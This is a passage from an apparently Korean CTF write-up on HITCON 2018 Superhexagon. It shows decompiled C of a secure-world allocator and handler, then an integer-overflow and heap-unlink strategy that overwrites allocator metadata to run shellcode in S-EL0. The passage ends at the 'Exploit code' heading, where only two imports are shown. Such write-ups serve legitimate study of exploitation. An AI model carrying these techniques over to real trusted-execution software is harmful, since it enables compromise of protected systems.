</span></span><span style="display:flex;"><span>      uStack_4c._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">27</span>];
</span></span><span style="display:flex;"><span>      uStack_48._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">28</span>];
</span></span><span style="display:flex;"><span>      uStack_48._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">29</span>];
</span></span><span style="display:flex;"><span>      uStack_48._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>      uStack_48._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">31</span>];
</span></span><span style="display:flex;"><span>      local_44._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>      local_44._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">33</span>];
</span></span><span style="display:flex;"><span>      local_44._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">34</span>];
</span></span><span style="display:flex;"><span>      local_44._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">35</span>];
</span></span><span style="display:flex;"><span>      uStack_40._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">36</span>];
</span></span><span style="display:flex;"><span>      uStack_40._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">37</span>];
</span></span><span style="display:flex;"><span>      uStack_40._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">38</span>];
</span></span><span style="display:flex;"><span>      uStack_40._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">39</span>];
</span></span><span style="display:flex;"><span>      uStack_3c._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">40</span>];
</span></span><span style="display:flex;"><span>      uStack_3c._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">41</span>];
</span></span><span style="display:flex;"><span>      uStack_3c._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">42</span>];
</span></span><span style="display:flex;"><span>      uStack_3c._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">43</span>];
</span></span><span style="display:flex;"><span>      uStack_38._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span>      uStack_38._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">45</span>];
</span></span><span style="display:flex;"><span>      uStack_38._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">46</span>];
</span></span><span style="display:flex;"><span>      uStack_38._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">47</span>];
</span></span><span style="display:flex;"><span>      local_34 <span style="color:#f92672">=</span> (undefined2)<span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070._48_4_;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcpy</span>(param_1<span style="color:#f92672">-&gt;</span>data,<span style="color:#f92672">&amp;</span>local_64);
</span></span><span style="display:flex;"><span>      param_1<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      UINT_ARRAY_00100000[idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> local_18;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100000</span>) <span style="color:#f92672">=</span> param_1<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)UINT_ARRAY_00100000[idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>],(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)param_1<span style="color:#f92672">-&gt;</span>data,(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)param_1<span style="color:#f92672">-&gt;</span>size);
</span></span><span style="display:flex;"><span>      param_1<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._0_4_;
</span></span><span style="display:flex;"><span>    uStack_2c <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._4_4_;
</span></span><span style="display:flex;"><span>    uStack_28 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._8_4_;
</span></span><span style="display:flex;"><span>    uStack_24 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._12_4_;
</span></span><span style="display:flex;"><span>    local_20 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._16_4_;
</span></span><span style="display:flex;"><span>    uStack_1c <span style="color:#f92672">=</span> (undefined2)<span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._20_4_;
</span></span><span style="display:flex;"><span>    cStack_1a <span style="color:#f92672">=</span> <span style="color:#a6e22e">SUB41</span>(<span style="color:#a6e22e">s_assert</span>(index_<span style="color:#f92672">&lt;</span>_DB_NUM)_00002058._20_4_,<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(param_1<span style="color:#f92672">-&gt;</span>data,<span style="color:#f92672">&amp;</span>local_30);
</span></span><span style="display:flex;"><span>    param_1<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">malloc</span>(uint sz)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  chunk <span style="color:#f92672">*</span>iVar1;
</span></span><span style="display:flex;"><span>  uint size;
</span></span><span style="display:flex;"><span>  freed_chunk <span style="color:#f92672">*</span>FD;
</span></span><span style="display:flex;"><span>  freed_chunk <span style="color:#f92672">*</span>BK;
</span></span><span style="display:flex;"><span>  uint cur_sz;
</span></span><span style="display:flex;"><span>  chunk <span style="color:#f92672">*</span>next_chunk;
</span></span><span style="display:flex;"><span>  freed_chunk <span style="color:#f92672">*</span>iter_chunk;
</span></span><span style="display:flex;"><span>  chunk <span style="color:#f92672">*</span>cur_chunk;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>cur_sz_addr;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)is_heap_initialized <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_000012c2</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  cur_chunk <span style="color:#f92672">=</span> Arena.chunk_ptr;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* size normalization */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (sz <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) {
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> sz <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffff0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x40000</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (iter_chunk <span style="color:#f92672">=</span> (Arena.freelist)<span style="color:#f92672">-&gt;</span>fd; iter_chunk <span style="color:#f92672">!=</span> Arena.freelist;
</span></span><span style="display:flex;"><span>        iter_chunk <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>fd) {
</span></span><span style="display:flex;"><span>      FD <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>      BK <span style="color:#f92672">=</span> (freed_chunk <span style="color:#f92672">*</span>)iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      cur_sz <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> cur_sz) {
</span></span><span style="display:flex;"><span>        BK<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> FD;
</span></span><span style="display:flex;"><span>        FD<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)BK;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* prev inuse bit set */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    cur_sz <span style="color:#f92672">=</span> (Arena.chunk_ptr)<span style="color:#f92672">-&gt;</span>sz <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&lt;=</span> cur_sz) {
</span></span><span style="display:flex;"><span>      next_chunk <span style="color:#f92672">=</span> (chunk <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>(Arena.chunk_ptr)<span style="color:#f92672">-&gt;</span>fd_const0 <span style="color:#f92672">+</span> size);
</span></span><span style="display:flex;"><span>      cur_sz_addr <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>(Arena.chunk_ptr)<span style="color:#f92672">-&gt;</span>sz;
</span></span><span style="display:flex;"><span>      Arena.chunk_ptr <span style="color:#f92672">=</span> next_chunk;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>cur_sz_addr <span style="color:#f92672">=</span> size <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      next_chunk<span style="color:#f92672">-&gt;</span>sz <span style="color:#f92672">=</span> cur_sz <span style="color:#f92672">-</span> size <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>cur_chunk<span style="color:#f92672">-&gt;</span>payload;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfff</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffff000</span>;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> (chunk <span style="color:#f92672">*</span>)<span style="color:#a6e22e">software_interrupt_2</span>(<span style="color:#ae81ff">0</span>,size,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xffffffff</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> (chunk <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span>      iVar1<span style="color:#f92672">-&gt;</span>sz <span style="color:#f92672">=</span> size <span style="color:#f92672">|</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>iVar1<span style="color:#f92672">-&gt;</span>payload;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* unlink */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>interger overflow가 발생한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4110f4f470742e21d147ea0cf3435c37.png" alt=""  />

aarch64 디버깅을 할 때 secure EL0를 직접적으로 디버깅은 불가능하지만 이렇게 간접적으로 메모리를 확인하는 것은 가능하다.
세 개의 청크를 할당한 모습이다.
취약점을 트리거하면 size가 너무 커져서 무조건 SIGSEGV가 나서 abort exception handler로 진입한다.
하지만 처음에 0xb에 대한 sighandler를 넘겨준적이 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_00001000</span>(undefined4 param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  TCI <span style="color:#f92672">*</span>pTVar1;
</span></span><span style="display:flex;"><span>  undefined4 <span style="color:#f92672">*</span>puVar2;
</span></span><span style="display:flex;"><span>  undefined4 uVar3;
</span></span><span style="display:flex;"><span>  undefined4 uStack_90;
</span></span><span style="display:flex;"><span>  undefined4 uStack_8c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_88;
</span></span><span style="display:flex;"><span>  undefined4 uStack_84;
</span></span><span style="display:flex;"><span>  undefined4 uStack_80;
</span></span><span style="display:flex;"><span>  undefined4 uStack_7c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_78;
</span></span><span style="display:flex;"><span>  undefined4 uStack_74;
</span></span><span style="display:flex;"><span>  undefined4 uStack_70;
</span></span><span style="display:flex;"><span>  undefined4 uStack_6c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_68;
</span></span><span style="display:flex;"><span>  undefined4 uStack_64;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cStack_60;
</span></span><span style="display:flex;"><span>  uint uStack_5c;
</span></span><span style="display:flex;"><span>  undefined2 <span style="color:#f92672">*</span>puStack_58;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcStack_54;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puStack_50;
</span></span><span style="display:flex;"><span>  undefined4 uStack_4c;
</span></span><span style="display:flex;"><span>  undefined auStack_48 [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  undefined4 uStack_44;
</span></span><span style="display:flex;"><span>  undefined4 uStack_3c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_38;
</span></span><span style="display:flex;"><span>  undefined4 uStack_34;
</span></span><span style="display:flex;"><span>  undefined4 uStack_30;
</span></span><span style="display:flex;"><span>  undefined4 uStack_2c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_28;
</span></span><span style="display:flex;"><span>  undefined4 uStack_24;
</span></span><span style="display:flex;"><span>  undefined4 uStack_20;
</span></span><span style="display:flex;"><span>  undefined2 auStack_1c [<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  TCI <span style="color:#f92672">*</span>pTStack_18;
</span></span><span style="display:flex;"><span>  TCI <span style="color:#f92672">*</span>pTStack_14;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  pTVar1 <span style="color:#f92672">=</span> tci_handle;
</span></span><span style="display:flex;"><span>  pTStack_14 <span style="color:#f92672">=</span> tci_handle;
</span></span><span style="display:flex;"><span>  uStack_3c <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._0_4_;
</span></span><span style="display:flex;"><span>  uStack_38 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._4_4_;
</span></span><span style="display:flex;"><span>  uStack_34 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._8_4_;
</span></span><span style="display:flex;"><span>  uStack_30 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._12_4_;
</span></span><span style="display:flex;"><span>  uStack_2c <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._16_4_;
</span></span><span style="display:flex;"><span>  uStack_28 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._20_4_;
</span></span><span style="display:flex;"><span>  uStack_24 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._24_4_;
</span></span><span style="display:flex;"><span>  uStack_20 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._28_4_;
</span></span><span style="display:flex;"><span>  auStack_1c[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> (undefined2)<span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._32_4_;
</span></span><span style="display:flex;"><span>  pTStack_18 <span style="color:#f92672">=</span> tci_handle;
</span></span><span style="display:flex;"><span>  tci_handle<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  uStack_44 <span style="color:#f92672">=</span> param_1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(pTVar1<span style="color:#f92672">-&gt;</span>data,<span style="color:#f92672">&amp;</span>uStack_3c);
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x104f</span>;
</span></span><span style="display:flex;"><span>  puVar2 <span style="color:#f92672">=</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_0000166c</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  pcStack_54 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>다시 원래 context로 복원하여 계속 실행되는 특징이 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/a0dc084795134a2ff9940e0df33e83df.png" alt=""  />

전에 직접 제작한 secure world에서의 pagewalk 결과를 보면, 매핑 자체가 PL0에서 RWX 임을 알 수 있다.
다음과 같은 malloc 내부 로직을 이용하여 4 bytes aaw를 달성한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>      FD <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>      BK <span style="color:#f92672">=</span> (freed_chunk <span style="color:#f92672">*</span>)iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      cur_sz <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> cur_sz) {
</span></span><span style="display:flex;"><span>        BK<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> FD;
</span></span><span style="display:flex;"><span>        FD<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)BK;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* prev inuse bit set */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      ...
</span></span></code></pre></div><p>Arena.chunk_ptr을 변조하면 SEL0의 code segment에 대한 청크 할당이 가능해진다.
이를 이용해 SEL0의 엔트리를 변조해서 임의 쉘코드 실행을 달성한다.</p>
<p>내부적으로 이미 할당된 청크에 대해서는 free이후 다시 할당해서 reclaim이 가능하다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f512d95c57426d767060cf08fcf02c4b.png" alt=""  />

freelist에 역순으로 size 더 크게해서 chunk free하고 취약점을 트리거해서 다음과 같이 메타데이터를 덮었다.
이후 Arena 구조체의 entry를 4 bytes aaw primitive를 이용해 덮고, freelist에 적합한 size를 초과한 크기를 할당하면 원하는 S-EL0의 .text 영역에 read/write가 가능해진다.</p>
<p>exploit 전략은 다음과 같다.</p>
<ol>
<li>chunk 2 1 0 free.</li>
<li>chunk 0 reclaim → heap overflow.</li>
<li>chunk 1 할당, 0x100050 fd,bk 작성해서 freelist 순회 끊키 → unlink aaw Arena.chunk_ptr overwrite → .text.</li>
<li>size를 0x300 정도로 설정해서 next chunk에 write 연산 sigsegv 방지, 돌고 있는 memcpy 코드 수정 방지 &amp; 할당된 청크에 쉘 코드 작성.</li>
<li>시스템 레지스터를 읽고 world shared memory에 flag write하고 software interrupt 0를 발생시켜 normal world로 복귀해서 플래그 출력.
취약점 자체는 간단해서 금방 찾았는데 malloc 내부 로직에서 자꾸 꼬여서 익스가 힘들었다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/a096b3c429e31b14826b3bcfb3af9a84.png" alt=""  />
</li>
</ol>
<h2 id="exploit-code-code-execution--flag">Exploit code (code execution &amp; flag)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-code-execution--flag">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
